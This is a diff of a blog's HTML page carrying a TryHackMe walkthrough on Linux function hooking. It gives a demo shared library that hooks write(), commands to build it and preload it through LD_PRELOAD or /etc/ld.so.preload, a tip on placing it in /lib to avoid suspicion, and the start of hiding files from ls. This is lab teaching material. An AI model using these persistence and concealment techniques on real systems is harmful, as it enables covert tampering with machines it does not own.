@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta http-equiv="X-UA-Compatible" content="ie=edge" />
@@ -13,7 +13,7 @@
 
 
 
-<meta name="author" content="Animesh Roy"  />
+<meta name="author" content="Animesh Roy @anir0y  "  />
 <meta name="description" content="TryHackMe Room Linux Function Hooking solved by Animesh Roy. this is a walkthough. read more... Learn about function hooking in Linux and have fun hooking functions" />
 
 
@@ -34,6 +34,16 @@
 
 
 
+<script type="text/javascript">
+  (function(c,l,a,r,i,t,y){
+      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+  })(window, document, "clarity", "script", "it10lq8bk1");
+</script>
+
+
+
 <meta property="og:type" content="website">
 <meta property="og:url" content="https://classroom.anir0y.in/">
 <meta property="og:title" content="Animesh Roy | Blogs & Writeups">
@@ -41,9 +51,11 @@
 <meta property="og:image" content="https://i.imgur.com/Ji5C41H.png">
 
 
+<script type="text/javascript" charset="UTF-8" src="//cdn.cookie-script.com/s/88cd00f83ae38d0239d06996b1ad293a.js"></script>
+
 
 <meta property="twitter:card" content="summary_large_image">
-<meta property="twitter:url" content="https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/">
+<meta property="twitter:url" content="http://localhost:1313/post/tryhackme-linuxfunctionhooking/">
 
 <meta property="twitter:title" content="Animesh Roy | Blogs & Writeups">
 <meta property="twitter:description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
@@ -63,22 +75,28 @@
 
 
 
-<link rel="canonical" href="https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/" />
+<link rel="canonical" href="http://localhost:1313/post/tryhackme-linuxfunctionhooking/" />
 
 
-<meta property="og:title" content="TryHackMe Linux Function Hooking" />
-<meta property="og:description" content="TryHackMe Room Linux Function Hooking solved by Animesh Roy. this is a walkthough. read more... Learn about function hooking in Linux and have fun hooking functions" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-linuxfunctionhooking/" /><meta property="article:section" content="post" />
-<meta property="article:published_time" content="2021-07-18T02:30:10+05:30" />
-<meta property="article:modified_time" content="2021-07-18T02:30:10+05:30" />
+<meta property="og:url" content="http://localhost:1313/post/tryhackme-linuxfunctionhooking/">
+  <meta property="og:site_name" content="Classroom">
+  <meta property="og:title" content="TryHackMe Linux Function Hooking">
+  <meta property="og:description" content="TryHackMe Room Linux Function Hooking solved by Animesh Roy. this is a walkthough. read more... Learn about function hooking in Linux and have fun hooking functions">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2021-07-18T02:30:10+05:30">
+    <meta property="article:modified_time" content="2021-07-18T02:30:10+05:30">
+    <meta property="article:tag" content="Tryhackme">
+    <meta property="article:tag" content="Rooms">
+    <meta property="article:tag" content="Thm">
 
 
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="TryHackMe Linux Function Hooking"/>
-<meta name="twitter:description" content="TryHackMe Room Linux Function Hooking solved by Animesh Roy. this is a walkthough. read more... Learn about function hooking in Linux and have fun hooking functions"/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="TryHackMe Linux Function Hooking">
+  <meta name="twitter:description" content="TryHackMe Room Linux Function Hooking solved by Animesh Roy. this is a walkthough. read more... Learn about function hooking in Linux and have fun hooking functions">
 
 
 <link rel="stylesheet" href="/css/semantic.min.css" />
@@ -153,7 +171,7 @@
     <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
   </div>
   <div class="item">
-    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/classroom.anir0y.in'"></i>
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'http:\/\/localhost:1313\/'"></i>
   </div>
   
   <div class="item">
@@ -225,10 +243,10 @@
         <i class="save icon"></i>
       </button>
 
-      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Linux%20Function%20Hooking&url=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-linuxfunctionhooking%2f" class="ui circular twitter icon button">
+      <a href="https://twitter.com/intent/tweet?text=TryHackMe%20Linux%20Function%20Hooking&url=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-linuxfunctionhooking%2f" class="ui circular twitter icon button">
   <i class="twitter icon"></i>
 </a>
-<a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fclassroom.anir0y.in%2fpost%2ftryhackme-linuxfunctionhooking%2f" class="ui circular facebook icon button">
+<a href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fpost%2ftryhackme-linuxfunctionhooking%2f" class="ui circular facebook icon button">
   <i class="facebook icon"></i>
 </a>
 
@@ -262,18 +280,18 @@
 
       <article class="main"><h2 id="overview">OverView</h2>
 <table>
-<thead>
-<tr>
-<th>Linux Function Hooking</th>
-<th></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><a href="https://tryhackme.com/room/linuxfunctionhooking">room</a></td>
-<td><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c0911c9d569c72aa687d73dce22a450a.png" alt="logo"></td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Linux Function Hooking</th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><a href="https://tryhackme.com/room/linuxfunctionhooking">room</a></td>
+          <td><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/c0911c9d569c72aa687d73dce22a450a.png" alt="logo"></td>
+      </tr>
+  </tbody>
 </table>
 <hr>
 <h2 id="task-01-introduction">task 01: Introduction</h2>
@@ -314,15 +332,15 @@
 <p>Or if you are using fish shell then:</p>
 <p><code># ldd (which ls)</code></p>
 <p>Either way, it should give you an output similar to this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># ldd /bin/ls        </span>
-linux-gate.so.1 <span style="color:#f92672">(</span>0xb7f54000<span style="color:#f92672">)</span>        
-libselinux.so.1 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libselinux.so.1 <span style="color:#f92672">(</span>0xb7ed7000<span style="color:#f92672">)</span>        
-libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7cf9000<span style="color:#f92672">)</span>         
-libdl.so.2 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libdl.so.2 <span style="color:#f92672">(</span>0xb7cf3000<span style="color:#f92672">)</span>
-libpcre.so.3 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpcre.so.3 <span style="color:#f92672">(</span>0xb7c7a000<span style="color:#f92672">)</span>
-/lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb7f56000<span style="color:#f92672">)</span>
-libpthread.so.0 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpthread.so.0 <span style="color:#f92672">(</span>0xb7c59000<span style="color:#f92672">)</span>
-</code></pre></div><p>Note: This example was taken from an x86 Kali System, on a 64-bit system we will have different locations and libraries.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># ldd /bin/ls        </span>
+</span></span><span style="display:flex;"><span>linux-gate.so.1 <span style="color:#f92672">(</span>0xb7f54000<span style="color:#f92672">)</span>        
+</span></span><span style="display:flex;"><span>libselinux.so.1 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libselinux.so.1 <span style="color:#f92672">(</span>0xb7ed7000<span style="color:#f92672">)</span>        
+</span></span><span style="display:flex;"><span>libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7cf9000<span style="color:#f92672">)</span>         
+</span></span><span style="display:flex;"><span>libdl.so.2 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libdl.so.2 <span style="color:#f92672">(</span>0xb7cf3000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>libpcre.so.3 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpcre.so.3 <span style="color:#f92672">(</span>0xb7c7a000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb7f56000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>libpthread.so.0 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpthread.so.0 <span style="color:#f92672">(</span>0xb7c59000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Note: This example was taken from an x86 Kali System, on a 64-bit system we will have different locations and libraries.</p>
 <p>Here, we find a library with the soname <code>libc.so.6</code> which is located at <code>/lib/i386-linux-gnu/libc.so.6</code>.
 Note: These are just symbolic links to the real shared library files located somewhere else in the system.</p>
 <p>Our main objective here is to understand how the system&rsquo;s dynamic linker loads these dynamic libraries during launching a program. For this, we will heavily refer to the <code>ld.so man page</code>.</p>
@@ -330,7 +348,7 @@ Note: These are just symbolic links to the real shared library files located som
 <ul>
 <li>Using the directories specified in the DT_RPATH dynamic section attribute of the binary if  present  and  DT_RUNPATH  attribute does not exist.  Use of DT_RPATH is deprecated.</li>
 <li>Using the environment variable LD_LIBRARY_PATH, unless the executable is being run in secure-execution mode (see  below),  in which case this variable is ignored.</li>
-<li>Using  the directories specified in the DT_RUNPATH dynamic section attribute of the binary if present.  Such directories  are searched  only to find those objects required by DT_NEEDED (direct dependencies) entries and do not apply to  those  objects' children,  which  must themselves have their own DT_RUNPATH entries.  This is unlike DT_RPATH, which is applied  to  searches  for all children in the dependency tree.</li>
+<li>Using  the directories specified in the DT_RUNPATH dynamic section attribute of the binary if present.  Such directories  are searched  only to find those objects required by DT_NEEDED (direct dependencies) entries and do not apply to  those  objects&rsquo; children,  which  must themselves have their own DT_RUNPATH entries.  This is unlike DT_RPATH, which is applied  to  searches  for all children in the dependency tree.</li>
 <li>From the cache file /etc/ld.so.cache, which contains a compiled list of candidate shared objects previously found in  the  augmented  library  path.  If, however, the binary was linked with the -z nodeflib linker option, shared objects in the default paths are skipped.  Shared objects installed in hardware capability directories (see below) are preferred to other  shared objects.</li>
 <li>In  the  default path /lib, and then /usr/lib.  (On some 64-bit   architectures, the default paths for 64-bit shared objects  are /lib64,  and  then  /usr/lib64.)  If the binary was linked with the -z nodeflib linker option, this step is skipped.</li>
 </ul>
@@ -369,16 +387,16 @@ data-ad-slot="7160066188"></ins></p>
 <h2 id="task-04-putting-on-our-coding-hats">Task 04: Putting On Our Coding Hats</h2>
 <p>Enough about the theory, time to get our hands dirty. So put your coding hats on and continue reading below:</p>
 <p>Before we start, we need to understand how things work. In this first example, we will hook the <code>write()</code> function.  First let&rsquo;s create a very simple program using <code>write()</code> :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
-int main<span style="color:#f92672">()</span>
-<span style="color:#f92672">{</span>
-  char str<span style="color:#f92672">[</span>12<span style="color:#f92672">]</span>;
-  int s;
-  s<span style="color:#f92672">=</span>read<span style="color:#f92672">(</span>0, str,13<span style="color:#f92672">)</span>;      
-  write<span style="color:#f92672">(</span>1, str, s<span style="color:#f92672">)</span>;                          
-  <span style="color:#66d9ef">return</span> 0;
-<span style="color:#f92672">}</span>
-</code></pre></div><p>First things first, let&rsquo;s compile and run our example to get an output as shown:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
+</span></span><span style="display:flex;"><span>int main<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  char str<span style="color:#f92672">[</span>12<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>  int s;
+</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">=</span>read<span style="color:#f92672">(</span>0, str,13<span style="color:#f92672">)</span>;      
+</span></span><span style="display:flex;"><span>  write<span style="color:#f92672">(</span>1, str, s<span style="color:#f92672">)</span>;                          
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> 0;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>First things first, let&rsquo;s compile and run our example to get an output as shown:</p>
 <p><img src="https://i.imgur.com/HlUwm67.png" alt="img"></p>
 <p>Here, we basically read some input from stdin and print it out to stdout. Pretty simple, right ? (Let&rsquo;s just ignore the bad memory management). Now, let&rsquo;s take a look at what goes on behind the scenes:</p>
 <p>Under normal circumstances, when the dynamic linker comes across the <code>write()</code> function, it looks up its address in the standard shared libraries. On encountering the first occurrence of <code>write()</code>, it passes the arguments to the function and return an output accordingly. Simple enough, right? Now it&rsquo;s time to get malicious.</p>
@@ -386,26 +404,26 @@ int main<span style="color:#f92672">()</span>
 <p>From the man pages we get the function definition of <code>write()</code> as <code>ssize_t write(int fd, const void *buf, size_t count);</code> with the return type being <code>ssize_t</code>.</p>
 <p><img src="https://i.imgur.com/7GroQ8K.png" alt="img"></p>
 <p>It is very important that our malicious function also has the same function definition and return type as the original function which we are trying to hook. With that out of the way, let&rsquo;s get to writing our own malicious shared library as follows:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>ssize_t <span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">int</span> fildes, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t nbytes)
-{
-     ssize_t (<span style="color:#f92672">*</span>new_write)(<span style="color:#66d9ef">int</span> fildes, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, size_t nbytes); 
-     ssize_t result;
-     new_write <span style="color:#f92672">=</span> dlsym(RTLD_NEXT, <span style="color:#e6db74">&#34;write&#34;</span>);
-     <span style="color:#66d9ef">if</span> (strncmp(buf, <span style="color:#e6db74">&#34;Hello World&#34;</span>,strlen(<span style="color:#e6db74">&#34;Hello World&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
-     {
-          result <span style="color:#f92672">=</span> new_write(fildes, <span style="color:#e6db74">&#34;Hacked 1337&#34;</span>, strlen(<span style="color:#e6db74">&#34;Hacked 1337&#34;</span>));
-     }
-     <span style="color:#66d9ef">else</span>
-     {
-          result <span style="color:#f92672">=</span> new_write(fildes, buf, nbytes);
-     }
-     <span style="color:#66d9ef">return</span> result;
-}
-</code></pre></div><p>Looks complicated, does it? Trust me, it&rsquo;s not. Let&rsquo;s break this down:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">write</span>(<span style="color:#66d9ef">int</span> fildes, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">ssize_t</span> (<span style="color:#f92672">*</span>new_write)(<span style="color:#66d9ef">int</span> fildes, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes); 
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">ssize_t</span> result;
+</span></span><span style="display:flex;"><span>     new_write <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlsym</span>(RTLD_NEXT, <span style="color:#e6db74">&#34;write&#34;</span>);
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strncmp</span>(buf, <span style="color:#e6db74">&#34;Hello World&#34;</span>,<span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;Hello World&#34;</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>     {
+</span></span><span style="display:flex;"><span>          result <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_write</span>(fildes, <span style="color:#e6db74">&#34;Hacked 1337&#34;</span>, <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;Hacked 1337&#34;</span>));
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>     {
+</span></span><span style="display:flex;"><span>          result <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_write</span>(fildes, buf, nbytes);
+</span></span><span style="display:flex;"><span>     }
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Looks complicated, does it? Trust me, it&rsquo;s not. Let&rsquo;s break this down:</p>
 <ul>
 <li>
 <p>First, we include the necessary header files which we will need to carry out simple tasks. Pretty standard thing, right?</p>
@@ -465,10 +483,10 @@ data-ad-slot="7160066188"></ins></p>
 <p>With the roadmap set, let&rsquo;s get going!</p>
 <h3 id="compiling-our-program">Compiling Our Program</h3>
 <p>To compile our program from the previous task, we will use the following:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">gcc -ldl malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so
-</code></pre></div><p><strong>Note : If you run into a <code>symbol lookup error</code> at any point, try the following compile statement:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl
-</code></pre></div><p>Like always, let&rsquo;s break down the statement to make sure that we understand all of this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>gcc -ldl malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so
+</span></span></code></pre></div><p><strong>Note : If you run into a <code>symbol lookup error</code> at any point, try the following compile statement:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc malicious.c -fPIC -shared -D_GNU_SOURCE -o malicious.so -ldl
+</span></span></code></pre></div><p>Like always, let&rsquo;s break down the statement to make sure that we understand all of this:</p>
 <ul>
 <li>gcc : Our very own GNU Compiler Collection</li>
 <li>-ldl : Link against libdl aka the dynamic linking library</li>
@@ -488,21 +506,21 @@ data-ad-slot="7160066188"></ins></p>
 </ul>
 <p>If you have been following along, you know that if both are specified, then the libraries specified by LD_PRELOAD are loaded first Both the methods have their pros and cons depending on the situation, but I personally prefer the latter because we can easily hide the /etc/ld.so.preload file using this very same method (explained in a later Task) and not the dot-before-filename way. Below is the syntax for pre-loading the shared object using each method:</p>
 <p><strong>Using LD_PRELOAD:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export LD_PRELOAD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/malicious.so
-</code></pre></div><p><strong>Using /etc/ld.so.preload:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo sh -c <span style="color:#e6db74">&#34;echo </span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">/malicious.so &gt; /etc/ld.so.preload&#34;</span>
-</code></pre></div><p><em>Note : Both of these commands must be run from the directory containing the shared object file. Ideally, you would want to store them somewhere like /lib or /usr/lib depending on where your system stores the shared library object files so as not to arouse suspicion.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export LD_PRELOAD<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>/malicious.so
+</span></span></code></pre></div><p><strong>Using /etc/ld.so.preload:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sh -c <span style="color:#e6db74">&#34;echo </span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">/malicious.so &gt; /etc/ld.so.preload&#34;</span>
+</span></span></code></pre></div><p><em>Note : Both of these commands must be run from the directory containing the shared object file. Ideally, you would want to store them somewhere like /lib or /usr/lib depending on where your system stores the shared library object files so as not to arouse suspicion.</em></p>
 <p>You can verify if your shared object was successfully loaded by doing a simple:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ldd /bin/ls
-     linux-gate.so.1 <span style="color:#f92672">(</span>0xb7fc0000<span style="color:#f92672">)</span>
-     /home/whokilleddb/malicious.so  <span style="color:#f92672">(</span>0xb7f8f000<span style="color:#f92672">)</span>
-     libselinux.so.1 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libselinux.so.1 <span style="color:#f92672">(</span>0xb7f43000<span style="color:#f92672">)</span>
-     libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7d65000<span style="color:#f92672">)</span>
-     lbdl.so.2 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libdl.so.2 <span style="color:#f92672">(</span>0xb7d5f000<span style="color:#f92672">)</span>
-     libpcre.so.3 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpcre.so.3 <span style="color:#f92672">(</span>0xb7ce6000<span style="color:#f92672">)</span>
-     /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb7fc2000<span style="color:#f92672">)</span>
-     libpthread.so.0 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpthread.so.0 <span style="color:#f92672">(</span>0xb7cc5000<span style="color:#f92672">)</span>
-</code></pre></div><p>[Awesome Explanation about that first linux-gate.so.1 library <a href="https://www.technovelty.org/linux/a-little-tour-of-linux-gateso.html">here</a>]</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ldd /bin/ls
+</span></span><span style="display:flex;"><span>     linux-gate.so.1 <span style="color:#f92672">(</span>0xb7fc0000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     /home/whokilleddb/malicious.so  <span style="color:#f92672">(</span>0xb7f8f000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     libselinux.so.1 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libselinux.so.1 <span style="color:#f92672">(</span>0xb7f43000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     libc.so.6 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span style="color:#f92672">(</span>0xb7d65000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     lbdl.so.2 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libdl.so.2 <span style="color:#f92672">(</span>0xb7d5f000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     libpcre.so.3 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpcre.so.3 <span style="color:#f92672">(</span>0xb7ce6000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     /lib/ld-linux.so.2 <span style="color:#f92672">(</span>0xb7fc2000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>     libpthread.so.0 <span style="color:#f92672">=</span>&gt; /lib/i386-linux-gnu/libpthread.so.0 <span style="color:#f92672">(</span>0xb7cc5000<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>[Awesome Explanation about that first linux-gate.so.1 library <a href="https://www.technovelty.org/linux/a-little-tour-of-linux-gateso.html">here</a>]</p>
 <p>The important thing to notice is that our malicious shared object is being loaded before the standard shared libraries.</p>
 <p>So now the scenario is something like this: The program makes a call to the write() function with all the parameters in place. However, instead of going to the libc definition of write() it goes to our malicious shared object as the dynamic linker finds the FIRST OCCURRENCE of write() and lets it do its thing, which in our case is a simple comparison operation which, if true, returns the malicious/tampered output, else passes on the parameters onto the real function inside libc and passes the output obtained back to the program.</p>
 <p>Pretty straight forward, right ? This process is roughly similar to the PATH Hijacking method which is widely used during CTFs and Pentests, so if you understand that well, this should be a breeze for you.</p>
@@ -541,14 +559,14 @@ data-ad-slot="7160066188"></ins></p>
 <p>Now that we know how to use Shared Objects to hook various functions, let&rsquo;s learn how to hide files from the <code>ls</code> command in a more efficient way than just putting-a-dot-before-filename.</p>
 <p>Before we attack the ls  command, we need to understand how it actually works. I will not go into details of the entire thing here (people are getting angry at the long tasks) but <a href="https://gist.github.com/amitsaha/8169242">here&rsquo;s an excellent resource</a> to understand the command, and it&rsquo;s workings in depth.</p>
 <p>The primary thing which we need to know here that the command uses a function called readdir() which returns a pointer to the next dirent structure in the directory. A dirent is a C - structure who&rsquo;s glibc definition can be obtained from the man page of readdir:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> dirent {
-     ino_t          d_ino;       <span style="color:#75715e">/* Inode number */</span>
-     off_t          d_off;       <span style="color:#75715e">/* Not an offset; see below */</span>
-     <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen;    <span style="color:#75715e">/* Length of this record */</span>
-     <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d_type;      <span style="color:#75715e">/* Type of file; not supported not supported by all filesystem types */</span>  
-     <span style="color:#66d9ef">char</span>           d_name[<span style="color:#ae81ff">256</span>]; <span style="color:#75715e">/* Null-terminated filename */</span>
-     };
-</code></pre></div><p>The main parameter which we are concerned about here is the <code>d_name[256]</code> which is a mandatory field and contains the name of the various files in our a directory. (See where I am going with this ?)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> dirent {
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">ino_t</span>          d_ino;       <span style="color:#75715e">/* Inode number */</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">off_t</span>          d_off;       <span style="color:#75715e">/* Not an offset; see below */</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> d_reclen;    <span style="color:#75715e">/* Length of this record */</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span>  d_type;      <span style="color:#75715e">/* Type of file; not supported not supported by all filesystem types */</span>  
